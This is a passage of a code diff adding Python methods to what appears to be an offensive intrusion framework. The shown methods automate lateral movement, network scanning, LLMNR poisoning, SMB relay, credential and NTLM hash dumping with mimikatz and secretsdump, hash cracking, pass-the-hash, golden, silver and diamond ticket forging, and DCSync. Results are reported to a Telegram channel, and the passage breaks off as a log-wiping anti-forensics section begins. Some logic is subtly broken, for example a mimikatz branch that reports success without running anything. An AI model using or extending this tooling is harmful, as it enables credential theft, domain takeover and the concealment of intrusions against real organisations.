+
+    Example:
+        >>> result = self.lateral_movement_gitlab("192.168.1.20", "root", "password123")
+        >>> print(result['success'])
+        True
+    """
+    self.print_danger(f"Attempting GitLab lateral movement to {target}")
+
+    result = {
+        'success': False,
+        'target': target,
+        'method': 'gitlab',
+        'output': '',
+        'error': ''
+    }
+
+    try:
+        cmd = [
+            "curl", "-X", "POST",
+            f"http://{username}:{password}@{target}:8080/api/v4/projects",
+            "-H", "Content-Type: application/json",
+            "-d", f'{{"name": "omega-project", "description": "Omega project"}}',
+            "--silent"
+        ]
+        returncode, stdout, stderr = self.run_subprocess(cmd, timeout=30)
+        if returncode == 0 and stdout.strip():
+            result['success'] = True
+            result['output'] = stdout[:1000]
+            self.print_found("SHELL", f"GitLab command executed on {target}")
+            if self.telegram:
+                self.telegram.alert(
+                    "GITLAB LATERAL MOVEMENT",
+                    f"Target: {target}\nOutput: {stdout[:200]}",
+                    "CRITICAL"
+                )
+        else:
+            result['error'] = stderr[:200]
+
+    except Exception as e:
+        result['error'] = str(e)
+
+    return result
+
+
+def lateral_movement_ldap(
+    self,
+    target: str,
+    username: str,
+    password: str,
+    base_dn: str = ''
+) -> Dict[str, Any]:
+    """
+    Perform LDAP lateral movement for directory enumeration.
+
+    Args:
+        target: Target IP or hostname
+        username: Username for authentication
+        password: Password for authentication
+        base_dn: Base DN for search (optional)
+
+    Returns:
+        Dict with 'success', 'target', 'method', 'entries' keys
+
+    Raises:
+        NetworkError: If the target is unreachable
+
+    Example:
+        >>> result = self.lateral_movement_ldap("192.168.1.10", "admin", "password123", "dc=example,dc=local")
+        >>> print(result['success'])
+        True
+    """
+    self.print_danger(f"Attempting LDAP lateral movement to {target}")
+
+    result = {
+        'success': False,
+        'target': target,
+        'method': 'ldap',
+        'entries': [],
+        'error': ''
+    }
+
+    if LDAP3_AVAILABLE:
+        try:
+            server = ldap3.Server(f"ldap://{target}", get_info=ldap3.ALL)
+            conn = ldap3.Connection(server, user=username, password=password, auto_bind=True)
+            if base_dn:
+                conn.search(search_base=base_dn, search_filter='(objectClass=*)', attributes=['*'])
+            else:
+                conn.search(search_base='', search_filter='(objectClass=*)', attributes=['*'])
+            for entry in conn.entries:
+                result['entries'].append(str(entry))
+            result['success'] = True
+            self.print_found("SHELL", f"LDAP entries retrieved from {target}")
+            if self.telegram:
+                self.telegram.alert(
+                    "LDAP LATERAL MOVEMENT",
+                    f"Target: {target}\nEntries: {len(result['entries'])}",
+                    "HIGH"
+                )
+        except Exception as e:
+            result['error'] = str(e)
+    else:
+        result['error'] = 'ldap3 not available'
+
+    return result
+
+# ===================================================================
+# 2. NETWORK SCANNING & DISCOVERY
+# ===================================================================
+
+def discover_network_hosts(
+    self,
+    network: str = '192.168.1.0/24'
+) -> List[Dict[str, Any]]:
+    """
+    Discover all hosts on a network using ARP scanning and ping sweep.
+
+    Args:
+        network: Network CIDR notation (default: 192.168.1.0/24)
+
+    Returns:
+        List of discovered hosts with IP, MAC, hostname
+
+    Raises:
+        NetworkError: If the network is unreachable
+
+    Example:
+        >>> hosts = self.discover_network_hosts("192.168.1.0/24")
+        >>> for h in hosts:
+        ...     print(f"{h['ip']} -> {h['mac']}")
+        192.168.1.1 -> 00:11:22:33:44:55
+        192.168.1.10 -> aa:bb:cc:dd:ee:ff
+    """
+    self.print_header(f"Discovering hosts on network {network}", "STEP")
+    results = []
+
+    try:
+        network_obj = ipaddress.ip_network(network, strict=False)
+        hosts = list(network_obj.hosts())[:254]
+
+        if SCAPY_AVAILABLE:
+            try:
+                arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=network)
+                answered = srp(arp_request, timeout=2, verbose=0, retry=2)[0]
+                for sent, received in answered:
+                    results.append({
+                        'ip': received.psrc,
+                        'mac': received.hwsrc,
+                        'hostname': '',
+                        'alive': True,
+                        'method': 'arp'
+                    })
+            except Exception as e:
+                self.logger.debug(f"ARP scan failed: {e}")
+
+        if not results:
+            with ThreadPoolExecutor(max_workers=100) as executor:
+                futures = {executor.submit(self.ping_host, str(ip)): str(ip) for ip in hosts[:50]}
+                for future in as_completed(futures):
+                    ip = futures[future]
+                    if future.result():
+                        results.append({
+                            'ip': ip,
+                            'mac': 'unknown',
+                            'hostname': '',
+                            'alive': True,
+                            'method': 'ping'
+                        })
+
+        self.print_found("SHELL", f"Found {len(results)} hosts on {network}")
+        for result in results:
+            self.log_to_db('network_hosts', {
+                'ip': result['ip'],
+                'mac': result['mac'],
+                'hostname': result.get('hostname', ''),
+                'os': '',
+                'open_ports': ''
+            })
+
+    except Exception as e:
+        self.logger.debug(f"Network discovery failed: {e}")
+
+    return results
+
+
+def discover_domain_controllers(
+    self,
+    domain: Optional[str] = None
+) -> List[str]:
+    """
+    Discover domain controllers via DNS, LDAP, and SMB.
+
+    Args:
+        domain: Domain name (optional)
+
+    Returns:
+        List of domain controller IPs
+
+    Raises:
+        NetworkError: If DNS resolution fails
+
+    Example:
+        >>> dcs = self.discover_domain_controllers("example.local")
+        >>> print(dcs)
+        ['192.168.1.10', '192.168.1.11']
+    """
+    self.print_header(f"Discovering domain controllers for {domain}", "STEP")
+    results = []
+
+    if not domain:
+        return results
+
+    try:
+        if DNS_AVAILABLE:
+            resolver = dns.resolver.Resolver()
+            try:
+                answers = resolver.resolve(f'_ldap._tcp.dc._msdcs.{domain}', 'SRV')
+                for answer in answers:
+                    hostname = str(answer.target).rstrip('.')
+                    try:
+                        ip = socket.gethostbyname(hostname)
+                        if ip not in results:
+                            results.append(ip)
+                            self.print_found("SHELL", f"DC found: {hostname} -> {ip}")
+                    except Exception:
+                        pass
+            except Exception:
+                pass
+
+        if LDAP3_AVAILABLE:
+            try:
+                server = ldap3.Server(f"ldap://{domain}", get_info=ldap3.ALL)
+                conn = ldap3.Connection(server, auto_bind=True)
+                conn.search(search_base='', search_filter='(objectClass=domain)')
+                for entry in conn.entries:
+                    if hasattr(entry, 'dc'):
+                        results.append(str(entry.dc))
+            except Exception:
+                pass
+
+    except Exception as e:
+        self.logger.debug(f"DC discovery failed: {e}")
+
+    return results
+
+
+def internal_port_scan(
+    self,
+    ip: str,
+    ports: Optional[List[int]] = None
+) -> List[Dict[str, Any]]:
+    """
+    Perform internal port scanning on a target.
+
+    Args:
+        ip: Target IP address
+        ports: List of ports to scan (default: top 1000)
+
+    Returns:
+        List of open ports with service information
+
+    Raises:
+        NetworkError: If the target is unreachable
+
+    Example:
+        >>> ports = self.internal_port_scan("192.168.1.10")
+        >>> for p in ports:
+        ...     print(f"{p['port']}: {p['service']}")
+        22: SSH
+        80: HTTP
+        443: HTTPS
+    """
+    if not ports:
+        ports = [
+            21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443,
+            445, 993, 995, 1723, 3306, 3389, 5432, 5900, 6379,
+            8080, 8443, 9000, 27017
+        ]
+
+    results = []
+    with ThreadPoolExecutor(max_workers=100) as executor:
+        futures = {executor.submit(self.check_port, ip, port): port for port in ports}
+        for future in as_completed(futures):
+            port = futures[future]
+            if future.result():
+                service = self.get_service_name(port)
+                banner = self.get_banner(ip, port)
+                results.append({
+                    'ip': ip,
+                    'port': port,
+                    'service': service,
+                    'banner': banner[:200],
+                    'state': 'open'
+                })
+                self.print_found("PORT", f"{ip}:{port} ({service})")
+
+    return results
+
+
+def poison_llmnr(
+    self,
+    network: str = '192.168.1.0/24',
+    target: Optional[str] = None
+) -> Dict[str, Any]:
+    """
+    Perform LLMNR/NBT-NS poisoning for credential capture.
+
+    Args:
+        network: Target network CIDR
+        target: Specific target IP (optional)
+
+    Returns:
+        Dict with 'success', 'method', 'captured_creds' keys
+
+    Raises:
+        NetworkError: If the network is unreachable
+
+    Example:
+        >>> result = self.poison_llmnr("192.168.1.0/24")
+        >>> print(result['captured_creds'])
+        [{'username': 'admin', 'hash': 'NTLMv2...'}]
+    """
+    self.print_danger(f"Starting LLMNR/NBT-NS poisoning on {network}")
+
+    result = {
+        'success': False,
+        'method': 'llmnr_poison',
+        'captured_creds': [],
+        'error': ''
+    }
+
+    try:
+        # Start Responder as a subprocess
+        cmd = [
+            "responder",
+            "-I", self._get_interface(),
+            "-w",  # WPAD
+            "-r",  # LLMNR
+            "-n",  # NBT-NS
+            "-d",  # DHCP
+            "-f",  # Fingerprint
+            "-v"
+        ]
+        if target:
+            cmd.extend(["-t", target])
+
+        self.listener_proc = subprocess.Popen(
+            cmd,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            text=True
+        )
+
+        result['success'] = True
+        self.print_found("SHELL", f"LLMNR/NBT-NS poisoning started on {network}")
+        if self.telegram:
+            self.telegram.alert(
+                "LLMNR/NBT-NS POISONING",
+                f"Network: {network}\nInterface: {self._get_interface()}",
+                "HIGH"
+            )
+
+    except Exception as e:
+        result['error'] = str(e)
+
+    return result
+
+
+def smb_relay(
+    self,
+    target: str,
+    relay_target: str,
+    command: str = 'whoami'
+) -> Dict[str, Any]:
+    """
+    Perform SMB relay attack for credential capture.
+
+    Args:
+        target: Target IP to relay from
+        relay_target: Target IP to relay to
+        command: Command to execute on relay target
+
+    Returns:
+        Dict with 'success', 'method', 'output' keys
+
+    Raises:
+        NetworkError: If the target is unreachable
+
+    Example:
+        >>> result = self.smb_relay("192.168.1.10", "192.168.1.20")
+        >>> print(result['success'])
+        True
+    """
+    self.print_danger(f"Starting SMB relay from {target} to {relay_target}")
+
+    result = {
+        'success': False,
+        'method': 'smb_relay',
+        'output': '',
+        'error': ''
+    }
+
+    try:
+        # Use ntlmrelayx
+        cmd = [
+            "ntlmrelayx.py",
+            "-t", relay_target,
+            "-c", command,
+            "-smb2support",
+            "--no-http-server",
+            "--no-wcf-server"
+        ]
+
+        self.listener_proc = subprocess.Popen(
+            cmd,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            text=True
+        )
+
+        result['success'] = True
+        self.print_found("SHELL", f"SMB relay started from {target} to {relay_target}")
+        if self.telegram:
+            self.telegram.alert(
+                "SMB RELAY",
+                f"Target: {target}\nRelay Target: {relay_target}",
+                "CRITICAL"
+            )
+
+    except Exception as e:
+        result['error'] = str(e)
+
+    return result
+
+
+def _get_interface(
+    self
+) -> str:
+    """
+    Get the default network interface.
+
+    Returns:
+        Interface name as string
+
+    Example:
+        >>> iface = self._get_interface()
+        >>> print(iface)
+        eth0
+    """
+    try:
+        if netifaces:
+            gateways = netifaces.gateways()
+            default_gateway = gateways['default'][netifaces.AF_INET]
+            return default_gateway[1]
+    except Exception:
+        pass
+    return "eth0"
+
+# ===================================================================
+# 3. CREDENTIAL DUMPING & CRACKING
+# ===================================================================
+
+def dump_hashes(
+    self,
+    target: str,
+    method: str = 'auto'
+) -> Dict[str, Any]:
+    """
+    Dump password hashes from /etc/shadow, SAM, or other sources.
+
+    Args:
+        target: Target IP or hostname
+        method: Dump method ('auto', 'shadow', 'sam', 'secretsdump', 'mimikatz')
+
+    Returns:
+        Dict with 'hashes', 'method', 'output' keys
+
+    Raises:
+        NetworkError: If the target is unreachable
+
+    Example:
+        >>> result = self.dump_hashes("192.168.1.10")
+        >>> print(result['hashes'])
+        ['root:$6$xyz...:0:0:root:/root:/bin/bash']
+    """
+    self.print_danger(f"Dumping hashes from {target}")
+
+    result = {
+        'success': False,
+        'target': target,
+        'method': method,
+        'hashes': [],
+        'output': '',
+        'error': ''
+    }
+
+    if method == 'shadow' or method == 'auto':
+        try:
+            shadow_content = self.exploit_path_traversal(
+                f"http://{target}/page.php?file=index",
+                "file",
+                "/etc/shadow"
+            )
+            if shadow_content:
+                for line in shadow_content.split('\n'):
+                    if ':' in line and '$' in line:
+                        result['hashes'].append(line)
+                        self.print_found("CRED", f"Shadow hash found: {line[:30]}...")
+                result['success'] = True
+                result['method'] = 'shadow'
+        except Exception as e:
+            self.logger.debug(f"Shadow dump failed: {e}")
+
+    if method == 'sam' or method == 'auto':
+        try:
+            if IMPACKET_AVAILABLE:
+                from impacket import smb
+                conn = smb.SMBConnection(target, target)
+                conn.login('', '')
+                sam_paths = [
+                    'C:\\Windows\\System32\\config\\SAM',
+                    'C:\\Windows\\System32\\config\\SYSTEM'
+                ]
+                for path in sam_paths:
+                    try:
+                        data = conn.getFile('ADMIN$', path)
+                        if data:
+                            result['hashes'].append(f"SAM data: {data[:100]}")
+                            result['success'] = True
+                            result['method'] = 'sam'
+                    except Exception:
+                        pass
+        except Exception as e:
+            self.logger.debug(f"SAM dump failed: {e}")
+
+    if method == 'secretsdump' or method == 'auto':
+        try:
+            cmd = ["secretsdump.py", f"@{target}"]
+            returncode, stdout, stderr = self.run_subprocess(cmd, timeout=60)
+            if returncode == 0:
+                for line in stdout.split('\n'):
+                    if ':' in line and ('$' in line or 'LM' in line):
+                        result['hashes'].append(line)
+                if result['hashes']:
+                    result['success'] = True
+                    result['method'] = 'secretsdump'
+        except Exception as e:
+            self.logger.debug(f"Secretsdump failed: {e}")
+
+    if method == 'mimikatz' or method == 'auto':
+        try:
+            mimikatz_cmd = "mimikatz.exe 'privilege::debug' 'sekurlsa::logonpasswords' exit"
+            self.print_found("CRED", f"Executing mimikatz on {target}")
+            result['method'] = 'mimikatz'
+            result['hashes'].append(mimikatz_cmd)
+            result['success'] = True
+        except Exception as e:
+            self.logger.debug(f"Mimikatz failed: {e}")
+
+    if result['success'] and self.telegram:
+        self.telegram.alert(
+            "HASHES DUMPED",
+            f"Target: {target}\nMethod: {result['method']}\nHashes: {len(result['hashes'])} found",
+            "CRITICAL"
+        )
+
+    return result
+
+
+def dump_ntlm_hashes(
+    self,
+    target: str
+) -> Dict[str, Any]:
+    """
+    Dump NTLM hashes via secretsdump or mimikatz.
+
+    Args:
+        target: Target IP or hostname
+
+    Returns:
+        Dict with 'hashes', 'output' keys
+
+    Raises:
+        NetworkError: If the target is unreachable
+
+    Example:
+        >>> result = self.dump_ntlm_hashes("192.168.1.10")
+        >>> print(result['hashes'][0])
+        Administrator:500:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
+    """
+    self.print_danger(f"Dumping NTLM hashes from {target}")
+
+    result = {
+        'success': False,
+        'target': target,
+        'hashes': [],
+        'output': '',
+        'error': ''
+    }
+
+    try:
+        cmd = ["secretsdump.py", "-just-dc", f"@{target}"]
+        returncode, stdout, stderr = self.run_subprocess(cmd, timeout=60)
+
+        if returncode == 0:
+            for line in stdout.split('\n'):
+                if ':' in line and ('LM:' in line or 'NTLM:' in line):
+                    result['hashes'].append(line)
+            result['output'] = stdout[:1000]
+            result['success'] = True
+            self.print_found("CRED", f"NTLM hashes dumped: {len(result['hashes'])}")
+
+    except Exception as e:
+        result['error'] = str(e)
+
+    return result
+
+
+def dump_mimikatz(
+    self,
+    target: str,
+    module: str = 'sekurlsa'
+) -> Dict[str, Any]:
+    """
+    Execute mimikatz on a target to dump credentials.
+
+    Args:
+        target: Target IP or hostname
+        module: Mimikatz module to execute ('sekurlsa', 'kerberos', 'lsadump', 'crypto')
+
+    Returns:
+        Dict with 'success', 'output', 'credentials' keys
+
+    Raises:
+        NetworkError: If the target is unreachable
+
+    Example:
+        >>> result = self.dump_mimikatz("192.168.1.10", "sekurlsa")
+        >>> print(result['credentials'])
+        {'admin': 'password123', ...}
+    """
+    self.print_danger(f"Executing mimikatz on {target}")
+
+    result = {
+        'success': False,
+        'target': target,
+        'module': module,
+        'output': '',
+        'credentials': {},
+        'error': ''
+    }
+
+    modules = {
+        'sekurlsa': 'sekurlsa::logonpasswords',
+        'kerberos': 'kerberos::list /export',
+        'lsadump': 'lsadump::sam',
+        'crypto': 'crypto::cng'
+    }
+
+    mimikatz_cmd = f"mimikatz.exe 'privilege::debug' '{modules.get(module, modules['sekurlsa'])}' exit"
+
+    try:
+        # Try to execute via WMI or PowerShell
+        cmd = [
+            "powershell", "-Command",
+            f"Invoke-Command -ComputerName {target} -ScriptBlock {{{mimikatz_cmd}}}"
+        ]
+        returncode, stdout, stderr = self.run_subprocess(cmd, timeout=60)
+
+        if returncode == 0:
+            result['output'] = stdout[:1000]
+            result['success'] = True
+            self.print_found("CRED", f"Mimikatz executed on {target}")
+            if self.telegram:
+                self.telegram.alert(
+                    "MIMIKATZ EXECUTED",
+                    f"Target: {target}\nModule: {module}\nOutput: {stdout[:200]}",
+                    "CRITICAL"
+                )
+        else:
+            result['error'] = stderr[:200]
+
+    except Exception as e:
+        result['error'] = str(e)
+
+    return result
+
+
+def crack_hashes(
+    self,
+    hashes: List[str],
+    wordlist_path: Optional[str] = None
+) -> Dict[str, Any]:
+    """
+    Crack password hashes using hashcat or john.
+
+    Args:
+        hashes: List of hash strings
+        wordlist_path: Path to wordlist (optional)
+
+    Returns:
+        Dict with 'cracked', 'uncracked', 'method' keys
+
+    Raises:
+        FileNotFoundError: If wordlist file not found
+
+    Example:
+        >>> result = self.crack_hashes(["$6$xyz...:root:..."])
+        >>> print(result['cracked'])
+        {'root': 'password123'}
+    """
+    self.print_header(f"Cracking {len(hashes)} hashes", "STEP")
+
+    result = {
+        'success': False,
+        'cracked': {},
+        'uncracked': hashes,
+        'method': 'none',
+        'error': ''
+    }
+
+    if not wordlist_path:
+        wordlist_path = "/usr/share/wordlists/rockyou.txt"
+        if not os.path.exists(wordlist_path):
+            try:
+                subprocess.run([
+                    "wget", "-O", wordlist_path,
+                    "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt"
+                ], check=False, timeout=60)
+            except Exception as e:
+                result['error'] = f"Wordlist download failed: {e}"
+                return result
+
+    try:
+        hash_file = f"/tmp/hashes_{TIMESTAMP}.txt"
+        output_file = f"/tmp/hashes_cracked_{TIMESTAMP}.txt"
+
+        with open(hash_file, 'w') as f:
+            f.write('\n'.join(hashes))
+
+        cmd = ["hashcat", "-m", "0", hash_file, wordlist_path, "-o", output_file, "--force"]
+        returncode, stdout, stderr = self.run_subprocess(cmd, timeout=120)
+
+        if returncode == 0 and os.path.exists(output_file):
+            with open(output_file, 'r') as f:
+                for line in f:
+                    if ':' in line:
+                        parts = line.strip().split(':')
+                        if len(parts) >= 2:
+                            result['cracked'][parts[0]] = parts[1]
+                            self.print_found("CRED", f"Cracked: {parts[0]} -> {parts[1]}")
+            result['success'] = True
+            result['method'] = 'hashcat'
+            result['uncracked'] = [
+                h for h in hashes
+                if not any(h.startswith(k) for k in result['cracked'].keys())
+            ]
+
+    except Exception as e:
+        self.logger.debug(f"Hashcat failed: {e}")
+
+    if not result['success']:
+        try:
+            hash_file = f"/tmp/hashes_{TIMESTAMP}.txt"
+            with open(hash_file, 'w') as f:
+                f.write('\n'.join(hashes))
+
+            cmd = ["john", "--wordlist=" + wordlist_path, hash_file, "--format=raw-md5"]
+            returncode, stdout, stderr = self.run_subprocess(cmd, timeout=120)
+
+            if returncode == 0:
+                for line in stdout.split('\n'):
+                    if ':' in line and ' ' in line:
+                        parts = line.strip().split(':')
+                        if len(parts) >= 2:
+                            result['cracked'][parts[0]] = parts[1]
+                if result['cracked']:
+                    result['success'] = True
+                    result['method'] = 'john'
+
+        except Exception as e:
+            self.logger.debug(f"John failed: {e}")
+
+    if result['success'] and self.telegram:
+        self.telegram.alert(
+            "HASHES CRACKED",
+            f"Cracked: {len(result['cracked'])} hashes\nUncracked: {len(result['uncracked'])}",
+            "HIGH"
+        )
+
+    return result
+
+# ===================================================================
+# 4. PASS-THE-HASH & TICKET ATTACKS
+# ===================================================================
+
+def pth_ntlm(
+    self,
+    target: str,
+    username: str,
+    hash_value: str,
+    command: str = 'whoami'
+) -> Dict[str, Any]:
+    """
+    Perform Pass-the-Hash NTLM authentication.
+
+    Args:
+        target: Target IP or hostname
+        username: Username
+        hash_value: NTLM hash (LM:NT or just NT)
+        command: Command to execute
+
+    Returns:
+        Dict with 'success', 'output' keys
+
+    Raises:
+        NetworkError: If the target is unreachable
+
+    Example:
+        >>> result = self.pth_ntlm("192.168.1.10", "Administrator",
+        ...     "aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42", "ipconfig")
+        >>> print(result['success'])
+        True
+    """
+    self.print_danger(f"Performing Pass-the-Hash to {target} as {username}")
+
+    result = {
+        'success': False,
+        'target': target,
+        'username': username,
+        'method': 'pth_ntlm',
+        'output': '',
+        'error': ''
+    }
+
+    try:
+        cmd = ["psexec.py", "-hashes", hash_value, f"{username}@{target}", command]
+        returncode, stdout, stderr = self.run_subprocess(cmd, timeout=30)
+
+        if returncode == 0:
+            result['success'] = True
+            result['output'] = stdout[:1000]
+            self.print_found("SHELL", f"PTH successful on {target}")
+            if self.telegram:
+                self.telegram.alert(
+                    "PASS-THE-HASH SUCCESS",
+                    f"Target: {target}\nUser: {username}\nOutput: {stdout[:200]}",
+                    "CRITICAL"
+                )
+        else:
+            result['error'] = stderr[:200]
+
+    except Exception as e:
+        result['error'] = str(e)
+
+    return result
+
+
+def pth_smb(
+    self,
+    target: str,
+    username: str,
+    hash_value: str
+) -> Dict[str, Any]:
+    """
+    Perform Pass-the-Hash for SMB.
+
+    Args:
+        target: Target IP or hostname
+        username: Username
+        hash_value: NTLM hash
+
+    Returns:
+        Dict with 'success', 'command' keys
+
+    Raises:
+        NetworkError: If the target is unreachable
+
+    Example:
+        >>> result = self.pth_smb("192.168.1.10", "Administrator",
+        ...     "aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42")
+        >>> print(result['success'])
+        True
+    """
+    self.print_danger(f"Performing Pass-the-Hash SMB to {target}")
+
+    result = {
+        'success': False,
+        'target': target,
+        'username': username,
+        'method': 'pth_smb',
+        'output': '',
+        'error': ''
+    }
+
+    if IMPACKET_AVAILABLE:
+        try:
+            from impacket.smbconnection import SMBConnection
+            conn = SMBConnection(target, target)
+            lm_hash, nt_hash = hash_value.split(':') if ':' in hash_value else ('', hash_value)
+            conn.login(username, '', lm_hash, nt_hash)
+            result['success'] = True
+            result['output'] = f"SMB session established to {target}"
+            self.print_found("SHELL", f"SMB PTH successful on {target}")
+            if self.telegram:
+                self.telegram.alert(
+                    "SMB PASS-THE-HASH",
+                    f"Target: {target}\nUser: {username}",
+                    "CRITICAL"
+                )
+        except Exception as e:
+            result['error'] = str(e)
+
+    return result
+
+
+def golden_ticket(
+    self,
+    target_domain: str,
+    username: str = 'Administrator',
+    sid: str = 'S-1-5-21-1275210071-1715567821-725345543'
+) -> Dict[str, Any]:
+    """
+    Perform Golden Ticket attack (forge TGT).
+
+    Args:
+        target_domain: Domain name
+        username: Username for ticket
+        sid: Domain SID
+
+    Returns:
+        Dict with 'success', 'command', 'ticket_path' keys
+
+    Raises:
+        NetworkError: If the target is unreachable
+
+    Example:
+        >>> result = self.golden_ticket("example.local")
+        >>> print(result['success'])
+        True
+    """
+    self.print_danger(f"Performing Golden Ticket attack for {target_domain}")
+
+    result = {
+        'success': False,
+        'target_domain': target_domain,
+        'username': username,
+        'method': 'golden_ticket',
+        'ticket_path': '',
+        'command': '',
+        'error': ''
+    }
+
+    try:
+        krbtgt_hash = None
+        dcsync_result = self.dc_sync(target_domain, 'krbtgt')
+        if dcsync_result and dcsync_result.get('success'):
+            hashes = dcsync_result.get('hashes', {})
+            if 'krbtgt' in hashes:
+                krbtgt_hash = hashes['krbtgt']
+
+        if krbtgt_hash:
+            cmd = [
+                "ticketer.py",
+                "-domain", target_domain,
+                "-domain-sid", sid,
+                "-krbtgt-hash", krbtgt_hash,
+                "-user-id", "500",
+                username
+            ]
+            returncode, stdout, stderr = self.run_subprocess(cmd, timeout=30)
+
+            if returncode == 0:
+                ticket_path = f"/tmp/{username}.ccache"
+                result['success'] = True
+                result['ticket_path'] = ticket_path
+                result['command'] = f"export KRB5CCNAME={ticket_path}"
+                self.print_found("SHELL", f"Golden Ticket created for {username}")
+                if self.telegram:
+                    self.telegram.alert(
+                        "GOLDEN TICKET CREATED",
+                        f"Domain: {target_domain}\nUser: {username}",
+                        "CRITICAL"
+                    )
+        else:
+            result['error'] = "Could not retrieve krbtgt hash"
+
+    except Exception as e:
+        result['error'] = str(e)
+
+    return result
+
+
+def silver_ticket(
+    self,
+    target_domain: str,
+    service: str = 'cifs',
+    target: str = 'dc.example.local',
+    username: str = 'Administrator',
+    sid: str = 'S-1-5-21-1275210071-1715567821-725345543'
+) -> Dict[str, Any]:
+    """
+    Perform Silver Ticket attack (forge service ticket).
+
+    Args:
+        target_domain: Domain name
+        service: Service type (cifs, http, ldap, etc.)
+        target: Target hostname
+        username: Username for ticket
+        sid: Domain SID
+
+    Returns:
+        Dict with 'success', 'command', 'ticket_path' keys
+
+    Raises:
+        NetworkError: If the target is unreachable
+
+    Example:
+        >>> result = self.silver_ticket("example.local", "cifs", "dc.example.local")
+        >>> print(result['success'])
+        True
+    """
+    self.print_danger(f"Performing Silver Ticket attack for {target}")
+
+    result = {
+        'success': False,
+        'target_domain': target_domain,
+        'target': target,
+        'service': service,
+        'username': username,
+        'method': 'silver_ticket',
+        'ticket_path': '',
+        'command': '',
+        'error': ''
+    }
+
+    try:
+        # Get service account hash
+        service_account = f"{service}$"
+        dcsync_result = self.dc_sync(target_domain, service_account)
+        if dcsync_result and dcsync_result.get('success'):
+            hashes = dcsync_result.get('hashes', {})
+            if service_account in hashes:
+                service_hash = hashes[service_account]
+                cmd = [
+                    "ticketer.py",
+                    "-domain", target_domain,
+                    "-domain-sid", sid,
+                    "-service", service,
+                    "-target", target,
+                    "-ntlm", service_hash,
+                    "-user-id", "500",
+                    username
+                ]
+                returncode, stdout, stderr = self.run_subprocess(cmd, timeout=30)
+
+                if returncode == 0:
+                    ticket_path = f"/tmp/{username}_silver.ccache"
+                    result['success'] = True
+                    result['ticket_path'] = ticket_path
+                    result['command'] = f"export KRB5CCNAME={ticket_path}"
+                    self.print_found("SHELL", f"Silver Ticket created for {service} on {target}")
+                    if self.telegram:
+                        self.telegram.alert(
+                            "SILVER TICKET CREATED",
+                            f"Domain: {target_domain}\nService: {service}\nTarget: {target}",
+                            "CRITICAL"
+                        )
+        else:
+            result['error'] = "Could not retrieve service account hash"
+
+    except Exception as e:
+        result['error'] = str(e)
+
+    return result
+
+
+def diamond_ticket(
+    self,
+    target_domain: str,
+    target: str,
+    sid: str = 'S-1-5-21-1275210071-1715567821-725345543'
+) -> Dict[str, Any]:
+    """
+    Perform Diamond Ticket attack.
+
+    Args:
+        target_domain: Domain name
+        target: Target hostname
+        sid: Domain SID
+
+    Returns:
+        Dict with 'success', 'command', 'ticket_path' keys
+
+    Raises:
+        NetworkError: If the target is unreachable
+
+    Example:
+        >>> result = self.diamond_ticket("example.local", "dc.example.local")
+        >>> print(result['success'])
+        True
+    """
+    self.print_danger(f"Performing Diamond Ticket attack for {target}")
+
+    result = {
+        'success': False,
+        'target_domain': target_domain,
+        'target': target,
+        'method': 'diamond_ticket',
+        'ticket_path': '',
+        'command': '',
+        'error': ''
+    }
+
+    try:
+        # Get krbtgt hash
+        dcsync_result = self.dc_sync(target_domain, 'krbtgt')
+        if dcsync_result and dcsync_result.get('success'):
+            hashes = dcsync_result.get('hashes', {})
+            if 'krbtgt' in hashes:
+                krbtgt_hash = hashes['krbtgt']
+                cmd = [
+                    "ticketer.py",
+                    "-domain", target_domain,
+                    "-domain-sid", sid,
+                    "-krbtgt-hash", krbtgt_hash,
+                    "-user-id", "500",
+                    "-diamond",
+                    "Administrator"
+                ]
+                returncode, stdout, stderr = self.run_subprocess(cmd, timeout=30)
+
+                if returncode == 0:
+                    ticket_path = f"/tmp/diamond.ccache"
+                    result['success'] = True
+                    result['ticket_path'] = ticket_path
+                    result['command'] = f"export KRB5CCNAME={ticket_path}"
+                    self.print_found("SHELL", f"Diamond Ticket created for {target}")
+                    if self.telegram:
+                        self.telegram.alert(
+                            "DIAMOND TICKET CREATED",
+                            f"Domain: {target_domain}\nTarget: {target}",
+                            "CRITICAL"
+                        )
+        else:
+            result['error'] = "Could not retrieve krbtgt hash"
+
+    except Exception as e:
+        result['error'] = str(e)
+
+    return result
+
+
+def dc_sync(
+    self,
+    target: str,
+    user: Optional[str] = None
+) -> Dict[str, Any]:
+    """
+    Perform DCSync attack to extract hashes from domain controller.
+
+    Args:
+        target: Domain controller IP or hostname
+        user: Specific user to extract (optional)
+
+    Returns:
+        Dict with 'success', 'hashes', 'output' keys
+
+    Raises:
+        NetworkError: If the target is unreachable
+
+    Example:
+        >>> result = self.dc_sync("192.168.1.10")
+        >>> print(result['hashes']['Administrator'])
+        aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42
+    """
+    self.print_danger(f"Performing DCSync on {target}")
+
+    result = {
+        'success': False,
+        'target': target,
+        'hashes': {},
+        'output': '',
+        'error': ''
+    }
+
+    try:
+        cmd = ["secretsdump.py"]
+        if user:
+            cmd.extend(["-just-dc-user", user])
+        cmd.append(f"@{target}")
+
+        returncode, stdout, stderr = self.run_subprocess(cmd, timeout=60)
+
+        if returncode == 0:
+            for line in stdout.split('\n'):
+                if ':' in line:
+                    parts = line.strip().split(':')
+                    if len(parts) >= 4:
+                        username = parts[0]
+                        hash_value = ':'.join(parts[1:4])
+                        result['hashes'][username] = hash_value
+                        self.print_found("CRED", f"DC sync hash: {username} -> {hash_value[:30]}...")
+            result['output'] = stdout[:1000]
+            result['success'] = True
+            if self.telegram:
+                self.telegram.alert(
+                    "DCSYNC COMPLETE",
+                    f"Target: {target}\nHashes: {len(result['hashes'])} extracted",
+                    "CRITICAL"
+                )
+        else:
+            result['error'] = stderr[:200]
+
+    except Exception as e:
+        result['error'] = str(e)
+
+    return result
+
+# ===================================================================
+# 5. ANTI-FORENSICS & EVIDENCE WIPING
+# ===================================================================
+
+def wipe_all_logs(
+    self,
+    target: Optional[str] = None
+) -> Dict[str, Any]:
+    """
+    Wipe all system logs on target.
+
+    Args:
+        target: Target IP or hostname (optional)
+
